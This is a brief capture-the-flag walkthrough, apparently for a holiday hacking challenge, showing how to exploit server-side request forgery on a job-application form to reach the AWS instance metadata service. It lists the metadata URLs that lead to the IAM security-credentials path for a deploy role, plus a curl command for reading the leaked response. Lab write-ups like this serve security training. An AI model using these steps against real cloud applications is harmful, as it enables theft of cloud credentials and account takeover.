# Goal
https://apply.jackfrosttower.com/
SSRF to access IMDS SecretAccessKey

# Hint

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html

# How

Go to the apply webpage

Fill in the form with random data, and in the URL to Public NLBI use : 
http://169.254.169.254

It will return a test.jpg but the jpg contains errors so isn't displayble
Curl it using : 

curl https://apply.jackfrosttower.com/images/test.jpg
And it return latest

Continue using http://169.254.169.254/latest
Then http://169.254.169.254/latest/meta-data
And finaly http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role 


